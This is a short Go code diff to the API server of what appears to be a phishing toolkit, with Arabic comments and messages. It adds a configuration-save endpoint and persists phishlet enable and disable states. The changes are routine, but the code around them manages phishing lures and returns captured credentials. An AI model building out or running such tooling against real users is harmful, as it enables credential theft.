@@ -116,6 +116,7 @@ func (as *ApiServer) Start() {
 	authorized.HandleFunc("/phishlets/{name}/enable", as.phishletEnableHandler).Methods("POST")
 	authorized.HandleFunc("/phishlets/{name}/disable", as.phishletDisableHandler).Methods("POST")
 	authorized.HandleFunc("/configs/hostname", as.hostnameConfigHandler).Methods("POST")
+	authorized.HandleFunc("/config/save", as.configSaveHandler).Methods("POST")
 	authorized.HandleFunc("/lures", as.luresHandler).Methods("GET", "POST")
 	authorized.HandleFunc("/lures/{id:[0-9]+}", as.lureHandler).Methods("GET", "DELETE")
 	authorized.HandleFunc("/lures/{id:[0-9]+}/enable", as.lureEnableHandler).Methods("POST")
@@ -781,6 +782,9 @@ func (as *ApiServer) phishletEnableHandler(w http.ResponseWriter, r *http.Reques
 		return
 	}
 
+	// التأكد من حفظ التغييرات
+	as.cfg.SavePhishlets()
+
 	as.jsonResponse(w, ApiResponse{
 		Success: true,
 		Message: fmt.Sprintf("تم تفعيل الـ phishlet '%s' بنجاح", name),
@@ -816,6 +820,9 @@ func (as *ApiServer) phishletDisableHandler(w http.ResponseWriter, r *http.Reque
 		as.jsonError(w, fmt.Sprintf("Failed to disable phishlet '%s': %v", name, err), http.StatusInternalServerError)
 		return
 	}
+	
+	// التأكد من حفظ التغييرات
+	as.cfg.SavePhishlets()
 	
 	as.jsonResponse(w, ApiResponse{
 		Success: true,
@@ -1226,6 +1233,18 @@ func (as *ApiServer) credsHandler(w http.ResponseWriter, r *http.Request) {
 		Success: true,
 		Message: "تم استرجاع بيانات الاعتماد بنجاح",
 		Data: credentials,
+	})
+}
+
+// إضافة معالج جديد لحفظ التكوين
+func (as *ApiServer) configSaveHandler(w http.ResponseWriter, r *http.Request) {
+	// حفظ التكوين
+	// هذا سيقوم بحفظ حالة الـ phishlets في ملف التكوين
+	as.cfg.SavePhishlets()
+	
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: "تم حفظ التكوين بنجاح",
 	})
 }
 
